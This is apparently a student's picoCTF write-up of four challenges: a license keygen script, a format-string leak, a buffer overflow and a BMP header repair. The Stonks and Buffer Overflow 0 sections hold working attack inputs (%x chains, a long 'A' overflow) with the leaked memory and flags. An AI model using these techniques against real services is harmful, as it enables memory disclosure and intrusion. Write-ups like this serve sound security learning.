# PICO CTF

## Keygenme-py

Couldn't really make heads or tails out of the question, so took some help from almond force’s YouTube video. Understood what the given code is doing and how to go about solving the hash to get the key to be inputted into the main calculator.

```python
import hashlib

username_trial = b"GOUGH"
key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
key_part_dynamic1_trial = ""
key_part_static2_trial = "}"
hash = hashlib.sha256(username_trial).hexdigest()

key_part_dynamic1_trial += hash[4]
key_part_dynamic1_trial += hash[5]
key_part_dynamic1_trial += hash[3]
key_part_dynamic1_trial += hash[6]
key_part_dynamic1_trial += hash[2]
key_part_dynamic1_trial += hash[7]
key_part_dynamic1_trial += hash[1]
key_part_dynamic1_trial += hash[8]

key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial

print(key_full_template_trial)
```

**KEY FOUND**: `picoCTF{1n_7h3_|<3y_of_f911a486}`

Verification: Inputted the key into the Arcane Calculator, resulting in a successful license registration, proving that the key found is correct.

## Stonks

Downloaded the `vuln.c` file and connected to the given server. Look at the `user_buf` field. Upon running the program from the terminal:

```bash
# Terminal Commands
┌─[v3sper@Parrot-VM]─[~]
└──╼ $nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p
Buying stonks with token:
0x9000350
Portfolio as of Fri Nov 10 03:07:47 UTC 2023


2 shares of D
23 shares of T
36 shares of Q
Goodbye!
┌─[v3sper@Parrot-VM]─[~]
└──╼ $nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x
Buying stonks with token:
8b65390804b00080489c3f7ecfd80ffffffff18b63160f7edd110
Portfolio as of Fri Nov 10 03:08:13 UTC 2023


1 shares of WOV
119 shares of CHNV
17 shares of KUNT
184 shares of FNJ
701 shares of IIJC
Goodbye!
┌─[✗]─[v3sper@Parrot-VM]─[~]
└──╼ $nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
9eee370804b00080489c3f7eedd80ffffffff19eec160f7efb110f7eeddc709eed18029eee3509eee3706f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff83007df7f28af8f7efb4407672800010f7d8ace9f7efc0c0f7eed5c0f7eed000ff839198f7d7b68df7eed5c08048ecaff8391a40f7f0ff09804b000f7eed000f7eede20ff8391d8f7f15d50f7eee89076728000f7eed000804b000ff8391d88048c869eec160ff8391c4ff8391d88048be9f7eed3fc0ff83928cff839284119eec16076728000ff8391f000f7d30fa1f7eed000f7eed0000f7d30fa11ff839284ff83928cff83921410f7eed000f7f1070af7f28000
Portfolio as of Fri Nov 10 04:20:17 UTC 2023

2 shares of Z
10 shares of QEDX
71 shares of FENQ
73 shares of XYF
Goodbye!

```

Upon running the program initially, we can try to get hexadecimal values from `user_buf`. 
On running multiple `%x` (hexadecimal input) commands, we get a large dump of values. 
Now we need to shorten it (we use CyberChef). The parameters used are **From hex** and **Swap endianness**. We can see the start should be by `6f` (`o`) and end with `7d` (curly brace `}`).

## Buffer Overflow 0

Upon downloading the `vuln.c` source file and examining it, we can see that:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

is a sigsegv handler which detects segmentation faults in the program. Upon spamming with `A` multiple times, we directly get our desired output:

```bash
# Terminal Commands
┌─[v3sper@Parrot-VM]─[~]
└──╼ $nc saturn.picoctf.net 65443
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}

```

### TUNNEL VISION

The downloaded file has some corrupted data. Upon opening it with a hex editor, we can see that it's a BMP file, i.e., it is a BitMap file. We see that the first line in the hex format has some errors upon comparing it to another bitmap file.

Now we can see an image of presumably a waterfall/stream. But it appears to be cropped. Next, we will try to use exiftool to analyze the properties of the image. We see that it is of size 1134x306, which in hex is equal to `0x46e` and `0x132`. The hex values are in reverse (height is as `23 01`).

Upon trying to get correct height values for the image running values like `hex(999)` etc. corrupt the image as they are way too big (i.e., bigger than the height of the image). Note: we are not modifying the width as it pixelates the image and ruins it.

Upon further trial value of 850 worked for setting the height (`0x352`) inputted as `52 03`.

This gives us the final enlarged image with the exact Flag required.

---
